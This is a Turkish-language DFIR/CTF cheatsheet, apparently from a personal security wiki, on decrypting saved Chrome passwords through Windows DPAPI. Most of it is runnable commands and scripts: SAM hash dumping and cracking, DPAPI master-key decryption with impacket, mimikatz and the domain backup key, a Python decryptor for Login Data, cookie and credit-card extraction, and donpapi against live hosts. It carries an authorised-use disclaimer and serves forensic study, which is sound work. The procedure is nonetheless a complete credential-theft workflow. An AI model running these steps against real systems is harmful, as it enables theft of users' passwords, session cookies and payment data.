---
title: "Chrome Parola Çıkarma — DPAPI"
date: 2026-10-06
tags: [windows, dpapi, chrome, credentials, post-exploitation, dfir, cheatsheet, methodology]
---
# Chrome Parola Çıkarma — DPAPI

> DFIR / CTF referansı. Kendi makinen, yetkili pentest kapsamı veya CTF/THM
> ortamı dışında kullanma. Bütün akış, elinde olması gereken bir sırra
> (hesap parolası, canlı oturum veya domain backup key) dayanır — DPAPI'nin
> tehdit modeli tam olarak budur.

## 0. Zincirin mantığı (önce bunu oturt)

Chrome parolaları tek katman değildir. İçten dışa doğru:

```
Kayıtlı parola
   └─ Chrome AES-GCM key ile şifreli        (Login Data içindeki v10 blobları)
        └─ AES key, DPAPI ile şifreli        (Local State → os_crypt.encrypted_key)
             └─ DPAPI blob, master key ile şifreli   (AppData\...\Protect\<GUID>)
                  └─ master key, kullanıcının SIRRI ile şifreli
                       ├─ yerel hesap  → parolanın SHA1'i
                       ├─ canlı oturum → bellekte zaten çözülü
                       └─ domain       → DC'deki backup key
```

Çözme yönü dıştan içe: **sır → master key → AES key → parola.**
Her halka bir sonrakini açar. Bir halka eksikse zincir orada durur. Çözülen
parola çoğu zaman **son hedef değil**, bir sonraki kapının (VeraCrypt kasası,
RDP, başka servis) anahtarıdır — bkz. Bölüm 8.

## 1. İhtiyacın olan dosyalar

Kurban profilinden şu yollar:

| Dosya | Yol | Ne işe yarar |
|---|---|---|
| Local State | `AppData\Local\Google\Chrome\User Data\Local State` | DPAPI ile şifreli AES key'i taşır (JSON) |
| Login Data | `AppData\Local\Google\Chrome\User Data\Default\Login Data` | Parolalar (SQLite, `v10` blobları) |
| Web Data | `...\Default\Web Data` | **autofill + kredi kartı.** autofill tablosu ŞİFRESİZDİR → düz metin ipucu |
| Cookies | `...\Default\Network\Cookies` | Oturum çerezleri (aynı AES key) |
| Master key'ler | `AppData\Roaming\Microsoft\Protect\<SID>\<GUID>` | AES key'i açan DPAPI master key'leri |
| Preferred | Aynı Protect klasörü | Aktif master key'in GUID'ini gösterir |

Notlar:
- `Login Data For Account` ayrı bir DB'dir (senkron profili) — orada da kayıt olabilir.
- Chrome kanalları ayrı profil tutar: `Chrome`, `Chrome Beta`, **`Chrome For Testing`** —
  hedef bunlardan birindeyse dosyalar o kanalın `User Data` ağacındadır.
- **autofill şifresiz:** `Web Data` → tablo `autofill`, kullanıcının form alanlarına
  yazdığı değerler (kullanıcı adı, arama terimi) düz metindir. Parola vermez ama
  isim/hedef ipucu verir (ör. bir kasa veya host adı). Zinciri çözmeden önce buna bak:
  ```bash
  sqlite3 "Web Data" "SELECT name, value FROM autofill;"
  ```

### SID'i bulma (offline senaryoda kritik)

Master key'i çözmek için SID şarttır ve yerel hesapta hash hesabının parçasıdır
(boş SID = kırılamaz/yanlış hash). Normalde `Protect\<SID>\` klasör adıdır, ama
dosyalar düz bir klasöre kopyalanmışsa başka yerden bul:

```bash
# 1) Orijinal triage ağacında Protect yolu (klasör adı = SID)
find . -ipath '*Microsoft/Protect*' 2>/dev/null

# 2) Her yerde SID deseni tara
grep -rao 'S-1-5-21-[0-9-]*' . 2>/dev/null | sort -u

# 3) Registry: SOFTWARE hive → ProfileList (SID ↔ C:\Users\<kullanıcı> eşleşmesi)
reglookup -p 'Microsoft/Windows NT/CurrentVersion/ProfileList' SOFTWARE 2>/dev/null \
  | grep -i ProfileImagePath

# 4) secretsdump çıktısındaki RID: makine SID + "-RID" = kullanıcı SID
#    (kullanıcının RID'i, ör. 1000 → makine SID'ine "-1000" ekle)
```

Kullanıcı hesabının SID'i genelde `-1000` / `-1001` ile biter (makine SID'i değil).

## 2. Dosyaları nereden çıkardın? (kaynak senaryolar)

**A) Pcap'ten (SMB/HTTP exfil):** Wireshark → *File → Export Objects → SMB/HTTP*.
`%5c` = `\` (URL-encode). Aynı dosyanın birden çok kopyası çıkabilir:

```bash
file *transfer*.exe          # hangileri gerçekten .NET/PE
md5sum *transfer*.exe        # aynı hash = tek kopya incele
```

Şifreli bir arşiv + şifreleyici exe çıktıysa, exe'yi decompile et (Ek A),
gömülü key/IV ile arşivi aç, içinden profil klasörü gelir.

**B) Çevrimdışı diskten / triage paketinden (KAPE, imaj, dual boot):**
En yaygın DFIR senaryosu. KAPE çıktısı orijinal yol yapısını korur:
`...\KAPE\C\Users\<kullanıcı>\AppData\...` — Chrome dosyaları, `Protect\<SID>\`
master key'leri ve registry hive'ları (`SAM`, `SYSTEM`, `SOFTWARE`) birlikte gelir.
Canlı oturum yoktur → master key'i açacak sır elinde olmalı (Bölüm 4). Hive'lar
burada altın değerinde: hem SID (ProfileList) hem de NT hash (SAM+SYSTEM) verirler.

**C) Canlı oturumdan:** Makine açık ve o kullanıcı oturmuş → en kolay yol,
parola bile gerekmez (Bölüm 4b).

## 3. Adım 1 — Local State hangi master key'i istiyor?

AES key rastgele bir master key ile değil, GUID'i blob'un içine yazılı belirli
biriyle şifrelenmiştir. DPAPI blob yapısında master key GUID'i offset 24–40'tadır:

```bash
python3 -c "
import base64, json, uuid
d = json.load(open('Local State'))
blob = base64.b64decode(d['os_crypt']['encrypted_key'])[5:]   # baştaki 'DPAPI' etiketi atılır
print('gerekli master key:', uuid.UUID(bytes_le=blob[24:40]))
"
```

Çıkan GUID, `Protect` klasöründeki dosyalardan biriyle eşleşir. Yanlış master
key ile denersen bir sonraki adım "decrypt failed" der — bu yüzden önce bunu bul.

## 4. Adım 2 — Master key'i çöz (KARAR NOKTASI)

Buradaki dallanma tüm işi belirler. Önce hesabın tipini tespit et:

```
Yerel hesap + parola biliniyor   → impacket-dpapi masterkey  (çevrimdışı çalışır)
Yerel hesap + parola YOK         → SAM/SYSTEM → NT hash → kır → parola  (4a-2)
Canlı oturum açık                → mimikatz /unprotect       (parola gerekmez)
Microsoft hesabı, makine kapalı  → düz parola TUTMAZ; TPM/PIN'e takılır
Domain (AD) ortamı               → domain backup key ile
```

> **Teknik not — neden parola, NT hash değil?** Yerel hesapta DPAPI master key'i
> parolanın **SHA1**'inden türetilen anahtarla korunur (impacket çıktısında
> `Decrypted key with User Key (SHA1)` tam olarak budur). Bu yüzden yerel hesapta
> NT hash'i *doğrudan* veremezsin — NT hash'i önce **parolaya** çevirmen (kırman)
> gerekir. (Domain hesabında durum farklıdır; orada backup key yolu kullanılır — 4d.)

### 4a. Yerel hesap — parola biliniyor

```bash
impacket-dpapi masterkey \
  -file "<GUID>" \
  -sid  "S-1-5-21-...-1000" \
  -password 'PAROLA'
```

Çıktı: `Decrypted key with User Key (SHA1)` + `Decrypted key: 0x<128 hex>` → not al.

> Parolayı geçmişe düşürmemek için: `read -s PW` ile gir, `-password "$PW"`
> kullan, sonra `unset PW`.

### 4a-2. Yerel hesap — parola bilinmiyor (iki yol, ikisi de parolaya çıkar)

**Yol 1 — SAM + SYSTEM'den NT hash (triage'da en garantili).** KAPE/imaj registry
hive'larını içeriyorsa NT hash'i doğrudan çıkar:

```bash
# config/ dizininde: SAM ve SYSTEM hive'ları
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
# -> <kullanıcı>:1001:aad3b435b51404eeaad3b435b51404ee:<NTHASH>:::
```

NT hash'i parolaya çevir (crackstation.net ya da yerel hashcat):

```bash
echo '<NTHASH>' > nt.hash
hashcat -m 1000 nt.hash /usr/share/wordlists/rockyou.txt
hashcat -m 1000 nt.hash --show
```

> İpucu: Birden çok hesap aynı NT hash'e sahipse (ör. Administrator ile bir kullanıcı)
> aynı parolayı paylaşıyorlardır — birini kırmak hepsini açar.

**Yol 2 — doğrudan DPAPI master key hash'ini kır (hive yoksa).** Sadece master key
dosyası + SID elindeyse john ile:

```bash
DPAPImk2john -mk "<GUID>" -c local -S "S-1-5-21-...-1000" > mkhash
cat mkhash     # $DPAPImk$... dolu olmalı (boş SID = bozuk hash)
john --format=DPAPImk --wordlist=/usr/share/wordlists/rockyou.txt mkhash
```

Parolayı elde edince → 4a'daki `masterkey` komutu.

### 4b. Canlı oturum (makine açık, en direkt)

Windows'ta, yönetici bir konsolda mimikatz:

```
privilege::debug
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

`/unprotect`, master key'i bellekten alır — Local State + Login Data zincirini
otomatik çözer, parola sormaz. Tek komutta URL/kullanıcı/parola verir.

### 4c. Microsoft hesabı + kapalı makine (çevrimdışı) — sınır

- **Hesap parolası düz olarak TUTMAZ:** master key bulut parolasıyla değil,
  yerel türetilmiş bir sırla korunur.
- **PIN (ör. 4 haneli) master key'i AÇMAZ:** PIN, Windows Hello / NGC + TPM
  zincirinin parçasıdır. TPM'e bağlıysa (modern makinelerde neredeyse hep)
  diskten çevrimdışı çözülemez — TPM donanımı devreye girmeden sır çıkmaz.
- **Pratik sonuç:** Microsoft hesabı + TPM/PIN'de, kapalı diskten Chrome
  parolalarını çözmek çoğunlukla mümkün değildir. Bu bir eksiklik değil,
  DPAPI'nin tasarımıdır ("disk çalınsa bile bellek/TPM olmadan açılmasın").
- **Çözüm:** Windows'a boot et → canlı oturumdan (4b) git. Kendi makinende
  ayrıca `chrome://password-manager/passwords` zaten hepsini gösterir.

### 4d. Domain (AD) ortamı

Master key'in yedeği DC'dedir. Domain admin / backup key varsa:

```bash
impacket-dpapi backupkeys -t 'DOMAIN/user:pass@dc-ip' --export
impacket-dpapi masterkey -file "<GUID>" -sid "<SID>" -pvk domain_backupkey.pvk
```

## 5. Adım 3 — Local State'teki AES key'i aç

Master key elinde → onunla Local State içindeki DPAPI blob'unu çöz.

```bash
# blob'u dosyaya yaz (baştaki 'DPAPI' etiketini at)
python3 -c "
import base64, json
d = json.load(open('Local State'))
k = base64.b64decode(d['os_crypt']['encrypted_key'])
open('/tmp/enc_key.bin','wb').write(k[5:])
"

# master key ile çöz
impacket-dpapi unprotect -file /tmp/enc_key.bin -key 0x<ADIM2_MASTERKEY>
```

Çıktı 32 byte'lık key'i 16'şar byte'lık iki satır hex olarak verir. Boşlukları
temizleyip birleştir → Chrome'un AES-GCM key'i (64 hex karakter).

## 6. Adım 4 — Login Data'daki parolaları çöz

`Login Data` bir SQLite DB'dir. `logins` tablosunda `origin_url`,
`username_value`, `password_value`. Parolalar AES-GCM `v10` blobları:

```
v10 (3 byte) | nonce (12 byte) | ciphertext | tag (16 byte)
```

```bash
python3 -c "
import sqlite3, shutil
from Crypto.Cipher import AES
KEY = bytes.fromhex('<ADIM3_AES_KEY_64HEX>')
shutil.copy('Login Data', '/tmp/logins.db')   # kilit sorunu olmasın diye kopya
con = sqlite3.connect('/tmp/logins.db')
for url, user, pw in con.execute('SELECT origin_url, username_value, password_value FROM logins'):
    if pw[:3] == b'v10':
        n, ct, tag = pw[3:15], pw[15:-16], pw[-16:]
        try:
            dec = AES.new(KEY, AES.MODE_GCM, nonce=n).decrypt_and_verify(ct, tag).decode('utf-8','replace')
        except Exception as e:
            dec = '<err %s>' % e
    else:
        dec = '<not v10>'
    print(url, '|', user, '|', dec)
"
```

Çıktı: `URL | kullanıcı | parola` satırları. CTF'de flag genelde parola alanında
`THM{...}` biçiminde olur. "index" soruları = satır sırası (1. satır = index 0/1).

`Crypto` bulunamazsa: `pip install pycryptodome --break-system-packages`

## 7. Aynı key ile: Cookies ve Kredi Kartları

Chrome'un AES key'i tektir; diğer DB'leri de açar. Sadece tablo/sütun değişir.
(`autofill` zaten şifresizdir — Bölüm 1.)

**Cookies** (`...\Default\Network\Cookies`, tablo `cookies`):
`SELECT host_key, name, encrypted_value FROM cookies` — `encrypted_value` aynı
`v10` formatı; çözülünce başında 32 byte SHA256(host) padding olabilir →
GCM sonrası `dec[32:]` almak gerekebilir (Chrome sürümüne göre).

**Web Data / kredi kartı** (tablo `credit_cards`):
`SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted
FROM credit_cards`.

## 8. Sonraki katman — çözülen parolayla şifreli kasayı açmak

Çözülen bir Chrome parolası sıklıkla **başka bir şifreli hedefin** anahtarıdır:
VeraCrypt/TrueCrypt kasası, BitLocker, RDP, SSH, bir servis girişi. autofill'deki
bir isim (ör. bir kasa adı) ya da `origin_url` hangi hedef olduğunu ele verir.

**Şifreli container'ı tanı:** `file` çıktısı `data`, boyut genelde tam yuvarlak
(ör. 100M), yüksek entropi, uzantısız/masum isim (`backup`, `.jpg`…):

```bash
find . -type f -size +1M -exec file {} \; 2>/dev/null | grep -iE ': *data$'
ls -lh ŞÜPHELİ ; file ŞÜPHELİ ; ent ŞÜPHELİ 2>/dev/null | grep Entropy   # ~7.99
```

**VeraCrypt/TrueCrypt'i Linux'ta aç (cryptsetup, VeraCrypt kurmaya gerek yok):**

```bash
sudo cryptsetup --type tcrypt open <kasa_dosyası> vault   # parola: çözülen Chrome parolası
sudo mkdir -p /mnt/vault && sudo mount /dev/mapper/vault /mnt/vault
ls -laR /mnt/vault
grep -rao 'THM{[^}]*}' /mnt/vault 2>/dev/null
# kapat:
sudo umount /mnt/vault && sudo cryptsetup close vault
```

- `No device header detected` → `--veracrypt-pim 0` ekle; hâlâ olmazsa gizli
  volume için `--tcrypt-hidden` dene. Açılış PBKDF2 yüzünden birkaç saniye sürer.
- İçerideki flag PDF/CSV gibi dosyadaysa: `pdftotext dosya.pdf -` veya
  `strings dosya | grep -i thm`.

## 9. v20 / App-Bound Encryption uyarısı (yeni Chrome)

Chrome 127+ sürümlerinde **çerezler** (ve giderek parolalar) `v10` yerine `v20`
ile App-Bound Encryption kullanır. Farkı:

- v20 anahtarı ek bir SYSTEM-DPAPI katmanıyla ve App-Bound servisine bağlı
  korunur; sadece kullanıcı master key'i yetmez.
- Çevrimdışı çözmek için SYSTEM DPAPI master key'i (ör. `SYSTEM` profilinin
  `Protect` klasörü + `SECURITY` hive'ından `DPAPI_SYSTEM` LSA secret) gerekir.
- Blob `v20` ile başlıyorsa yukarıdaki `v10` yolu **çalışmaz**; `donpapi` gibi
  App-Bound destekleyen araçlara ya da canlı oturuma geç.

Hızlı kontrol:
```bash
python3 -c "
import sqlite3
c=sqlite3.connect('Login Data')
for (pw,) in c.execute('SELECT password_value FROM logins LIMIT 5'):
    print(pw[:3])
"
```
`b'v10'` → yukarıdaki akış. `b'v20'` → App-Bound, farklı yol.

## 10. Otomatik araç (elle uğraşma)

`donpapi` bütün zinciri (master key → AES key → Login Data/Cookies/Web Data,
v10+v20 dahil) tek komuta indirir:

```bash
pipx install donpapi
donpapi collect -t <ip> -u <user> -p <pass>     # canlı hedefe karşı
```

Öğrenmek için elle yap; hız için donpapi.

## 11. Sık hatalar → çözüm

| Belirti | Sebep | Çözüm |
|---|---|---|
| `terminfo database is invalid` (dotnet) | Kali'nin yeni ncurses'i + eski .NET 6 | `env -u TERM dotnet ...` veya .NET güncelle |
| `ilspycmd not compatible with net6.0` | Son sürüm .NET 10 ister | `--version 8.2.0.7535` ile eski sürüm kur |
| `DPAPImk2john` hash'i boş/kısa | SID boş verildi (`-S ""`) | Doğru SID ile üret (Bölüm 1 SID bulma) |
| `unprotect: decrypt failed` | Yanlış master key veya yanlış sır | Adım 1'deki GUID'i ve parolayı doğrula |
| `masterkey decrypt failed` (MS hesabı) | Bulut parolası master key'i açmaz | Canlı oturum / TPM gerekir (4c) |
| NT hash master key'i açmıyor | Yerel hesap SHA1 ister, NTLM değil | NT hash'i önce kır → parolayı ver (4a-2) |
| `PermissionError` dosya yazarken | Klasör sahibi root, sen normal kullanıcı | `/tmp`'ye yaz veya `chown` |
| `No module named Crypto` | pycryptodome yok | `pip install pycryptodome --break-system-packages` |
| GCM `MAC check failed` | Dosya eksik export edildi | Wireshark'ta dosya boyutunu kontrol et |
| Parola `b'v20'` başlıyor | App-Bound Encryption | Bkz. Bölüm 9 |
| `cryptsetup: No device header detected` | Yanlış parola / PIM / gizli volume | `--veracrypt-pim 0`, `--tcrypt-hidden` (Bölüm 8) |

## Ek A — .NET exe'yi decompile etme (kaynak şifreleyici için)

```bash
export PATH="$PATH:/root/.dotnet/tools"
env -u TERM dotnet tool install -g ilspycmd --version 8.2.0.7535
env -u TERM ilspycmd -p -o ./src 'transfer.exe'      # -p: .csproj'lu proje
grep -rniE "aes|rijndael|rsa|key|iv|password|encrypt|http|\.enc" ./src
```

Windows'ta GUI istersen: **dnSpyEx** veya **ILSpy** — exe'yi sürükle bırak,
`Main`'e git. Debug edeceksen izole, internetsiz VM kullan.

Bakılacak yerler: `Main`, `System.Security.Cryptography` (AES/RSA, key & IV
nereden), hardcoded string'ler, dosya uzantısı/klasör listeleri, ağ bağlantıları.

## Ek B — Tek bakışta komut sırası (offline / KAPE senaryosu)

```bash
# 0) autofill ipucu (şifresiz) + hangi profil
sqlite3 "Web Data" "SELECT name, value FROM autofill;"

# 1) SID (Protect yolu / ProfileList / secretsdump RID)
grep -rao 'S-1-5-21-[0-9-]*' . | sort -u

# 2) parola: SAM/SYSTEM → NT hash → kır
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
hashcat -m 1000 nt.hash /usr/share/wordlists/rockyou.txt --show

# 3) hangi master key?
python3 -c "import base64,json,uuid;d=json.load(open('Local State'));b=base64.b64decode(d['os_crypt']['encrypted_key'])[5:];print(uuid.UUID(bytes_le=b[24:40]))"

# 4) master key'i çöz
impacket-dpapi masterkey -file "<GUID>" -sid "<SID>" -password 'PAROLA'

# 5) Local State AES key'ini aç
python3 -c "import base64,json;d=json.load(open('Local State'));open('/tmp/k.bin','wb').write(base64.b64decode(d['os_crypt']['encrypted_key'])[5:])"
impacket-dpapi unprotect -file /tmp/k.bin -key 0x<MASTERKEY>

# 6) parolaları dök
python3 -c "import sqlite3,shutil;from Crypto.Cipher import AES;K=bytes.fromhex('<AESKEY>');shutil.copy('Login Data','/tmp/l.db');[print(u,'|',n,'|',(AES.new(K,AES.MODE_GCM,nonce=p[3:15]).decrypt_and_verify(p[15:-16],p[-16:]).decode('utf-8','replace') if p[:3]==b'v10' else '<not v10>')) for u,n,p in sqlite3.connect('/tmp/l.db').execute('SELECT origin_url,username_value,password_value FROM logins')]"

# 7) çözülen parolayla kasa (varsa)
sudo cryptsetup --type tcrypt open <kasa_dosyası> vault && sudo mount /dev/mapper/vault /mnt/vault
```

## Anahtar çıkarım

- **Yerel hesap + parola kırılabiliyorsa** (THM/KAPE) zincir baştan sona çözülür:
  SID'i triage'dan bul, parolayı SAM/SYSTEM → NT hash → rockyou ile al, master
  key → AES key → Login Data. Çözülen parola çoğu zaman bir **VeraCrypt kasasının**
  ya da başka servisin anahtarıdır.
- **Microsoft hesabı + TPM/PIN'li kapalı makine çözülmez** çünkü çevrimdışı
  master key açılamaz.
- Fark, DPAPI'nin tehdit modelini gösterir: saldırganın diski alması yetmez,
  oturumu veya TPM'i de ele geçirmesi gerekir.

---
**Up:** [Home](Home.md)
**Related:** [Active Directory](Active%20Directory.md) · [THM-Ra-Writeup](THM-WriteUps/THM-Ra-Writeup.md) · [regex](regex.md)
